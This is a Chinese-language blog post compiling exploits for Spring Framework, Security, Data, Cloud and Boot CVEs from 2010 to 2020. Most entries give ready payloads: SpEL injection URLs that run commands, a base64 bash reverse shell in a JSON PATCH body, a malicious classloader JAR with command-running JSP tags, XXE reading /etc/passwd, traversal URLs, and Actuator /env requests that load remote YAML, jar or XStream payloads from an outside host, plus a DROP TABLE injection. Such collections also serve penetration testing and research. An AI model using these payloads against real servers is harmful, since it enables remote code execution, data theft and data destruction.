> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [misakikata.github.io](https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/)

虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。

### [](#CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行 "CVE-2010-1622 Spring Framework class.classLoader类远程代码执行")CVE-2010-1622 Spring Framework class.classLoader类远程代码执行

影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7

Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。

```


1.  `示例：`
2.  `POST /adduser HTTP/1.0`
3.  `...`
4.  `firstName = Tavis&lastName = Ormandy`

6.  `如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street = Disclosure + Str。将等效于：`

8.  `frmObj.getUser().getAddress().setStreet("Disclosure Str.")` 
9.  `问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用  java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着' class '属性及其后的所有内容均可用于HTTP请求中的设置。`

11.  `攻击`
12.  `如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求：`
13.  `POST /adduser HTTP/1.0`
14.  `...`
15.  `class.classLoader.URLs[0] = jar:http://attacker/spring-exploit.jar!`

17.  `她将 使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素.`
18.  `它将是哪个类加载器？`
19.  `在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader`


```

如何构造这个jar，需要包含以下信息：

```


1.  `- META-INF/spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类`
2.  `- META-INF/tags/中的标签文件，包含有标签定义（任意Java代码）`


```

/META-INF/spring-form.tld文件：

```


1.  `<!-- <form:input/> tag -->`
2.   `<tag-file>`
3.   `<name>input</name>`
4.   `<path>/META-INF/tags/InputTag.tag</path>`
5.   `</tag-file>`


```

/META-INF/tags/InputTag.tag

```


1.  `<%@ tag dynamic-attributes="dynattrs" %>`
2.  `<%`
3.   `j java.lang.Runtime.getRuntime().exec("mkdir /tmp/PWNED");` 
4.  `%>`


```

做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些：

```


1.  `<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>` 
2.  `<form:form command>`
3.  `<form:input path="name"/>`
4.  `</form:form>`


```

攻击者访问url,即可触发远程代码执行的效果:

```


1.  `http://inbreak.net/springmvc/testjsp.htm? class.classLoader.URLs[0]=jar:https://inbreak.net/spring-exploit.jar!/`


```

如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改

spring-form.tld，给其中的inputtag改名，name改为inputkxlzx：

```


1.  `<tag>`
2.   `<name>inputkxlzx</name>  //什么名字都行`


```

在文件中新加入一个tag，叫做input：

```


1.  `<tag-file>`
2.   `<name>input</name>`
3.   `<path>/WEB-INF/tags/InputTag.tag</path>`
4.   `</tag-file>`


```

InputTag.tag的内容：

```


1.  `<%@ tag dynamic-attributes="dynattrs" %>`
2.  `<%`
3.  `if (request.getParameter("kxlzxcmd")!=null)` 
4.   `exec(request.getParameter("kxlzxcmd"));` 
5.  `%>`
6.  `<form:inputkxlzx path="${dynattrs.path}"></form:inputkxlzx>`


```

访问的时候需要在参数中携带kxlzxcmd

```


1.  `/test.htm?name=kxlzx&kxlzxcmd=calc   //包含input的页面`


```

[http://blog.o0o.nu/2010/06/cve-2010-1622.html](http://blog.o0o.nu/2010/06/cve-2010-1622.html)

[https://www.inbreak.net/archives/377](https://www.inbreak.net/archives/377)

### [](#CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入 "CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入")CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入

影响版本：3.0.0至3.2.3、4.0.0.M1

受影响版本容易受到XML外部实体（XXE）注入的攻击。该`SourceHttpMessageConverter`处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。

当传输xml结构体时，如

```


1.  `<?xml version="1.0" encoding="ISO-8859-1"?>`
2.   `<username>John</username>`
3.  `</xml>`


```

外部XML实体- `xxe`是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 `/etc/passwd`并将其显示给呈现给用户。

```


1.  `<?xml version="1.0" encoding="ISO-8859-1"?>`
2.  `<!DOCTYPE foo [`
3.   `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>`
4.   `<username>&xxe;</username>`
5.  `</xml>`


```

其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。

### [](#CVE-2013-7315-Spring-Framework中的XML外部实体 "CVE-2013-7315 Spring Framework中的XML外部实体")CVE-2013-7315 Spring Framework中的XML外部实体

影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）

由于对 **CVE-2013-4152**和**CVE-2013-6429的**修复不完整导致。

受影响版本容易受到XML外部实体（XXE）注入的攻击。该`SourceHttpMessageConverter`处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。

当传输xml结构体时，如

```


1.  `<?xml version="1.0" encoding="ISO-8859-1"?>`
2.   `<username>John</username>`
3.  `</xml>`


```

外部XML实体- `xxe`是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 `/etc/passwd`并将其显示给呈现给用户。

```


1.  `<?xml version="1.0" encoding="ISO-8859-1"?>`
2.  `<!DOCTYPE foo [`
3.   `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>`
4.   `<username>&xxe;</username>`
5.  `</xml>`


```

其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。

### [](#CVE-2014-3527-Spring-Security验证绕过漏洞 "CVE-2014-3527 Spring Security验证绕过漏洞")CVE-2014-3527 Spring Security验证绕过漏洞

影响版本：

```


1.  `SpringSource Spring Security 3.1-3.2.4`


```

```


1.  `当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。`


```

### [](#CVE-2014-0097-Spring-Security认证绕过 "CVE-2014-0097 Spring Security认证绕过")CVE-2014-0097 Spring Security认证绕过

影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5

```


1.  `ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。`


```

### [](#CVE-2014-3578-Spring-Framework-目录遍历漏洞 "CVE-2014-3578 Spring Framework 目录遍历漏洞")CVE-2014-3578 Spring Framework 目录遍历漏洞

影响版本：

```


1.  `Spring Framework:`
2.  `- 3.0.4 to 3.2.11`
3.  `- 4.0.0 to 4.0.7`
4.  `- 4.1.0 to 4.1.1`


```

在web.xml存在如下情况下存在目录遍历：

```


1.  `<mvc:resources mapping="/css/**" location="file:webapps/springapp/WEB-INF/classes/theme/css/" />`


```

访问：

```


1.  `GET /springapp/css/file:/etc/passwd`


```

### [](#CVE-2016-2173-Spring-AMQP中的远程代码执行 "CVE-2016-2173 Spring AMQP中的远程代码执行")CVE-2016-2173 Spring AMQP中的远程代码执行

影响版本：1.0.0至1.5.4

[https://github.com/HaToan/CVE-2016-2173](https://github.com/HaToan/CVE-2016-2173)

使用方式：

```


1.  `- ysoserial-0.0.4-all.jar create payload write and execute a shell`
2.   `+ java -jar ysoserial-0.0.4-all.jar 'library_vul' 'command'`

4.  `- exploit-cve2016-2173.jar : send to App vul`
5.   `+ java -jar exploit-cve2016-2173.jar` 


```

本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。

### [](#CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞 "CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞")CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞

影响版本：2.0.0-2.0.9、1.0.0-1.0.5

[https://www.seebug.org/vuldb/ssvid-92474](https://www.seebug.org/vuldb/ssvid-92474)

漏洞利用POC：

```


1.  `http://localhost:8080/oauth/authorize?response_type=token&client_id=acme&redirect_uri=${2334-1}`


```

![image-20200331090423266](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131645.png)

执行命令：

```


1.  `http://207.246.79.196:8080/oauth/authorize?response_type=token&client_id=acme&redirect_uri=${T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)}`


```

![image-20200331092210362](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131647.png)

但是此命令执行，不会在页面上显示，只会打印出运行的对象。

如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的 值时会进行一次转义，利用如下脚本加工。

```


1.  `#coding:utf-8`

3.  `message = input('Enter message to encode:')`

5.  `print('Decoded string (in ASCII):\n')`

7.  `print('T(java.lang.Character).toString(%s)' % ord(message[0]), end="")`
8.  `for ch in message[1:]:`
9.   `print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=""),` 
10.  `print('\n')`

12.  `print('new java.lang.String(new byte[]{', end=""),`
13.  `print(ord(message[0]), end="")`
14.  `for ch in message[1:]:`
15.   `print(',%s' % ord(ch), end=""),` 
16.  `print(')}')`




```

执行输出后再添加：

```


1.  `T(java.lang.Runtime).getRuntime().exec(payload)`


```

### [](#CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞 "CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞")CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞

影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0

[https://www.cnblogs.com/litlife/p/10183137.html](https://www.cnblogs.com/litlife/p/10183137.html)

下载存在漏洞的版本1.3.0：[https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip](https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip)

POC：

```


1.  `/?payload=${new%20java.lang.String(new%20byte[]{70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66})}`
2.  `结果：`
3.  `FBB204A4061FFBD41284A84C258C1BFB`
4.  `返回结果是md5(wooyun)`


```

### [](#CVE-2016-6652-Spring-Data-JPA-SQL盲注 "CVE-2016-6652 Spring Data JPA SQL盲注")CVE-2016-6652 Spring Data JPA SQL盲注

影响版本：Spring Data JPA 1.10.2、1.9.4

[https://www.seebug.org/vuldb/ssvid-92534](https://www.seebug.org/vuldb/ssvid-92534)

### [](#CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞 "CVE-2017-4971 Spring WebFlow 远程代码执行漏洞")CVE-2017-4971 Spring WebFlow 远程代码执行漏洞

影响版本：Spring Web Flow 2.4.0 to 2.4.4

使用vulhub搭建环境后，在添加poc执行

```


1.  `&_(new+java.lang.ProcessBuilder("ping","xxx.ceye.io")).start()=vulhub`


```

![image-20200331111056698](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131651.png)

![image-20200331111146008](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131653.png)

无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞：

```


1.  `&_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader("vulnerable","True").aaa=n1nty`


```

![image-20200331111225481](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131655.png)

### [](#CVE-2017-8045-Spring-Amqp中的远程代码执行 "CVE-2017-8045 Spring Amqp中的远程代码执行")CVE-2017-8045 Spring Amqp中的远程代码执行

影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本

[https://xz.aliyun.com/t/36](https://xz.aliyun.com/t/36)

### [](#CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码 "CVE-2017-8046 Spring Data REST PATCH请求远程执行代码")CVE-2017-8046 Spring Data REST PATCH请求远程执行代码

影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本

[https://www.cnblogs.com/co10rway/p/9380441.html](https://www.cnblogs.com/co10rway/p/9380441.html)

利用POC执行：

```


1.  `[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String('ping xxx.ceye.io'))/lastname", "value": "vulhub" }]`


```

反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题[java.lang.Runtime.exec() Payload Workarounds](http://www.jackson-t.ca/runtime-exec-payloads.html)：

```


1.  `[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'))/lastname", "value": "vulhub" }]`


```

![image-20200331114458798](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131657.png)

![image-20200331115328723](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131700.png)

### [](#CVE-2018-1258-Spring-Security未经授权的访问 "CVE-2018-1258 Spring Security未经授权的访问")CVE-2018-1258 Spring Security未经授权的访问

影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本）

暂无详细信息

### [](#CVE-2018-1259-具有XMLBeam的Spring-DataXXE "CVE-2018-1259 具有XMLBeam的Spring DataXXE")CVE-2018-1259 具有XMLBeam的Spring DataXXE

影响版本：

```


1.  `XMLBeam 1.4.14或更早版本结合使用的Spring Data Commons`
2.  `Spring Data Commons 1.13至1.13.11（Ingalls SR11）`
3.  `Spring Data REST 2.6至2.6.11（Ingalls SR11）`
4.  `Spring Data Commons 2.0至2.0.6（Kay SR6）`
5.  `Spring Data REST 3.0至3.0.6（Kay SR6）`


```

[http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/](http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/)

[https://xz.aliyun.com/t/2341](https://xz.aliyun.com/t/2341)

### [](#CVE-2018-1270-Spring-Messaging远程代码执行漏洞 "CVE-2018-1270 Spring Messaging远程代码执行漏洞")CVE-2018-1270 Spring Messaging远程代码执行漏洞

影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14

同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求

```


1.  `ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket`


```

![image-20200331163229079](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131702.png)

从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包

![image-20200331170304494](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131704.png)

在发送任意消息，即可触发

![image-20200331170357879](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131707.png)

或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用[poc](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py)

### [](#CVE-2018-1271-Spring-MVC-目录穿越漏洞 "CVE-2018-1271 Spring MVC 目录穿越漏洞")CVE-2018-1271 Spring MVC 目录穿越漏洞

当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。

此漏洞触发条件较高：

1.  Server运行于Windows系统上
2.  从文件系统提供的文件服务（比如使用file协议，但不是file open）
3.  没有使用CVE-2018-1199漏洞的补丁
4.  不使用Tomcat或者是WildFly做Server

漏洞利用和复现:

[https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/](https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/)

### [](#CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞 "CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞")CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞

影响版本：

```


1.  `Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)`
2.  `Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)`
3.  `Spring Data Commons 2.0 to 2.0.5 (Kay SR5)`
4.  `Spring Data REST 3.0 - 3.0.5 (Kay SR5)`


```

[https://www.cnblogs.com/hac425/p/9656747.html](https://www.cnblogs.com/hac425/p/9656747.html)

![image-20200331171801189](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131709.png)

POC：

```


1.  `username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe")]=xxx`
2.  `username[T(java.lang.Runtime).getRuntime().exec("ping+xxx.ceye.io")]=test`


```

### [](#CVE-2018-1260-Spring-Security-Oauth2-远程代码执行 "CVE-2018-1260 Spring Security Oauth2 远程代码执行")CVE-2018-1260 Spring Security Oauth2 远程代码执行

影响版本：

```


1.  `Spring Security OAuth 2.3 to 2.3.2`
2.  `Spring Security OAuth 2.2 to 2.2.1`
3.  `Spring Security OAuth 2.1 to 2.1.1`
4.  `Spring Security OAuth 2.0 to 2.0.14`


```

[https://www.seebug.org/vuldb/ssvid-97287](https://www.seebug.org/vuldb/ssvid-97287)

此漏洞和CVE-2016-4977类似

POC：

```


1.  `http://localhost:8080/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.baidu.com&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D`


```

### [](#CVE-2018-15758-spring-security-oauth2权限提升 "CVE-2018-15758 spring-security-oauth2权限提升")CVE-2018-15758 spring-security-oauth2权限提升

影响版本：

```


1.  `Spring Security OAuth 2.3至2.3.3`
2.  `Spring Security OAuth 2.2至2.2.2`
3.  `Spring Security OAuth 2.1至2.1.2`
4.  `Spring Security OAuth 2.0到2.0.15`


```

使用了EnableResourceServer并且用了`AuthorizationRequest`的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。

例如劫持code，并且篡改其中的scope到all的话：

```


1.  `http://localhost:8080/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://127.0.0.1&scope=openid`


```

![image-20200401094048949](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131712.png)

即授权了读取权限的时候，修改为all就可以获得全部权限。

### [](#CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历 "CVE-2019-3799 Spring Cloud Config Server: 目录遍历")CVE-2019-3799 Spring Cloud Config Server: 目录遍历

影响版本：Spring-Cloud-Config-Server < 2.1.2, 2.0.4, 1.4.6

下载受影响的版本构建：[https://github.com/spring-cloud/spring-cloud-config](https://github.com/spring-cloud/spring-cloud-config)

```


1.  `cd spring-cloud-config-server` 
2.  `../mvnw spring-boot:run`


```

构建成功后访问：

```


1.  `http://127.0.0.1:8888/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd` 


```

![image-20200401100511941](Spring 漏洞.assets/image-20200401100511941.png)

其中路径代表：`/{name}/{profile}/{label}/`，如下中所显示的json。

![image-20200401102213915](https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131715.png)

### [](#CVE-2019-3778-Spring-Security-OAuth-开放重定向 "CVE-2019-3778 Spring Security OAuth 开放重定向")CVE-2019-3778 Spring Security OAuth 开放重定向

影响版本：

```


1.  `Spring Security OAuth 2.3 to 2.3.4`
2.  `Spring Security OAuth 2.2 to 2.2.3`
3.  `Spring Security OAuth 2.1 to 2.1.3`
4.  `Spring Security OAuth 2.0 to 2.0.16`


```

[https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70](https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70)

用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。

例如原始请求如下：

```


1.  `/auth/oauth/authorize?response_type=code&client_id=R2dpxQ3vPrtfgF72&scope=user_info&state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&redirect_uri=http://localhost:8086/login`


```

只需要修改为：

```


1.  `/auth/oauth/authorize?response_type=code&client_id=R2dpxQ3vPrtfgF72&scope=user_info&state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&redirect_uri=http://%localhost:8086/login`


```

这样就不会产生原本的认证错误，而且直接跳转到地址

```


1.  `Location: http://localhost:8086/login`


```

### [](#CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞 "CNVD-2019-11630 Spring Boot Actuator命令执行漏洞")CNVD-2019-11630 Spring Boot Actuator命令执行漏洞

[https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#)

这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点

1.  Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。

```


1.  `/dump-显示线程转储（包括堆栈跟踪）`
2.  `/trace-显示最后几条HTTP消息（其中可能包含会话标识符）`
3.  `/logfile-输出日志文件的内容`
4.  `/shutdown-关闭应用程序`
5.  `/mappings-显示所有MVC控制器映射`
6.  `/env-提供对配置环境的访问`
7.  `/restart-重新启动应用程序`


```

2.  jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：[http://127.0.0.1:8090/jolokia/list](http://127.0.0.1:8090/jolokia/list)

Logback库提供的**reloadByURL**操作使我们可以从外部URL重新加载日志配置，地址如：

```


1.  `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`

3.  `logback.xml：`
4.  `<configuration>`
5.   `<insertFromJNDI env-entry- />`
6.  `</configuration>`


```

reloadByURL功能从[http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。](http://artsploit.com/logback.xml%E4%B8%8B%E8%BD%BD%E6%96%B0%E9%85%8D%E7%BD%AE%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%A7%A3%E6%9E%90%E4%B8%BALogback%E9%85%8D%E7%BD%AE%E3%80%82%E8%BF%99%E5%B0%B1%E5%AF%BC%E8%87%B4%E4%B8%A4%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9AXXE%E7%9B%B2%E6%94%BB%E5%87%BB%E3%80%81%E6%81%B6%E6%84%8FLDAP%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E5%BC%95%E7%94%A8%E5%AF%BC%E8%87%B4RCE%E3%80%82)

3.  通过/env来修改配置

如果Spring Cloud Libraries在类路径中，则**’/ env’**端点允许您修改Spring环境属性。

```


1.  `POST /env HTTP/1.1`
2.  `Host: 127.0.0.1:8090`
3.  `Content-Type: application/x-www-form-urlencoded`
4.  `Content-Length: 65`

6.  `eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream`


```

此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client <1.8.7，则可以利用其中的**XStream反序列化漏洞**。

其中xstream的内容类似如下：

```


1.  `<linked-hash-set>`
2.   `<jdk.nashorn.internal.objects.NativeString>`
3.   `<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">`
4.   `<dataHandler>`
5.   `<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">`
6.   `<is class="javax.crypto.CipherInputStream">`
7.   `<cipher class="javax.crypto.NullCipher">`
8.   `<serviceIterator class="javax.imageio.spi.FilterIterator">`
9.   `<iter class="javax.imageio.spi.FilterIterator">`
10.   `<iter class="java.util.Collections$EmptyIterator"/>`
11.   `<next class="java.lang.ProcessBuilder">`
12.   `<command>`
13.   `<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>`
14.   `</command>`
15.   `<redirectErrorStream>false</redirectErrorStream>`
16.   `</next>`
17.   `</iter>`
18.   `<filter class="javax.imageio.ImageIO$ContainsFilter">`
19.   `<method>`
20.   `<class>java.lang.ProcessBuilder</class>`
21.   `<name>start</name>`
22.   `<parameter-types/>`
23.   `</method>`
24.   `<name>foo</name>`
25.   `</filter>`
26.   `<next class="string">foo</next>`
27.   `</serviceIterator>`
28.   `<lock/>`
29.   `</cipher>`
30.   `<input class="java.lang.ProcessBuilder$NullInputStream"/>`
31.   `<ibuffer></ibuffer>`
32.   `</is>`
33.   `</dataSource>`
34.   `</dataHandler>`
35.   `</value>`
36.   `</jdk.nashorn.internal.objects.NativeString>`
37.  `</linked-hash-set>`


```

然后调用’/ refresh’端点。

4.  有一种通过Spring环境属性修改来实现RCE的更可靠方法：

```


1.  `POST /env HTTP/1.1`
2.  `Host: 127.0.0.1:8090`
3.  `Content-Type: application/x-www-form-urlencoded`
4.  `Content-Length: 59`

6.  `spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml`


```

该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。

```


1.  `POST /refresh HTTP/1.1`
2.  `Host: 127.0.0.1:8090`
3.  `Content-Type: application/x-www-form-urlencoded`
4.  `Content-Length: 0`


```

从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：

```


1.  `!!javax.script.ScriptEngineManager [`
2.   `!!java.net.URLClassLoader [[`
3.   `!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]`
4.   `]]`
5.  `]`


```

该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)

5.  /env配置

除了关于执行RCE的地方，还有一些设置也很有用。

**spring.datasource.tomcat.validationQuery = drop + table + users-**允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。

**spring.datasource.tomcat.url** = jdbc:hsqldb:[https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。](https://localhost:3002/xdb%E5%85%81%E8%AE%B8%E6%82%A8%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E7%9A%84JDBC%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82)

这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。

### [](#CVE-2019-11269-Spring-Security-OAuth-开放重定向 "CVE-2019-11269 Spring Security OAuth 开放重定向")CVE-2019-11269 Spring Security OAuth 开放重定向

此漏洞为CVE-2019-3778的延伸版本，效果一致

影响版本：

```


1.  `Spring Security OAuth 2.3至2.3.5`
2.  `Spring Security OAuth 2.2至2.2.4`
3.  `Spring Security OAuth 2.1至2.1.4`
4.  `Spring Security OAUth 2.0至2.0.17`


```

### [](#CVE-2020-5398-Spring-Framework-RFD漏洞 "CVE-2020-5398 Spring Framework RFD漏洞")CVE-2020-5398 Spring Framework RFD漏洞

影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16

触发此漏洞的要求可以控制`content-disposition`文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。

```


1.  `<a href=”https://<trusted-server>.com/api/users/<attacker_id>.cmd" download>`
2.  `Click me, Im a dolphin`
3.  `</a>`


```

先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。

由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。

spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。

当受害者点击如上的地址时，会下载一个.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。

但是这个设置可以绕过，采用如下形式：

```


1.  `filename：secure_install.cmd";`


```

会在表头中闭合造成如下效果：

```


1.  `Content-Disposition: attachment; file`


```

从而达到绕过限制来下载预先设定好的可执行文件等。

### [](#CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露 "CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露")CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露

影响版本：spring-cloud-config-server < 2.2.2

